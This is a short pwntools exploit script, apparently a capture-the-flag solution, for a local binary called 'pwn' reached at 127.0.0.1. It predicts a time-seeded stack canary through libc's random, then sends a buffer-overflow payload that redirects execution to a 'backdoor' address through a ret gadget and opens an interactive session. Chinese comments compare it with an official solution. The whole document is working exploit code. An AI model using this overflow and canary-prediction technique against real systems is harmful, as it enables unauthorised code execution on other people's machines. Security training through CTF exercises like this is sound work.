from pwn import *
from ctypes import CDLL, c_int, c_uint
import time

context(arch='amd64',log_level='debug',os='linux',endian='little')

# 加载 C 标准库
libc = CDLL("libc.so.6")

p = process('./pwn')
p = remote('127.0.0.1',61234)

# 设置随机数种子（与目标程序相同）
current_time = int(time.time())
libc.srandom(current_time)

# 生成随机数（与目标程序相同的算法）
random_value = libc.random()
canary = random_value % 114514

print(f"Time seed: {current_time}")
print(f"Random value: {random_value}")
print(f"Canary: {canary}")

p.recvuntil(b' (y/n)\n')
p.sendline(b'y')

backdoor = 0x401276
ret = 0x4012ED
# payload = b'a'*124 + p64(canary) + b'a'*4+ b'a'*4 +p32(1)+ b'a'*8+p64(ret)+ p64(backdoor)
payload = b'a'*124 + p32(canary) + b'a'*24+p64(ret)+ p64(backdoor)
# 官解: payload = b'a'*128 + p32(canary) + b'a'*0x18 + p64(backdoor) 需要ret占位的 
p.recvuntil(b'message: ')
p.sendline(payload)

p.interactive()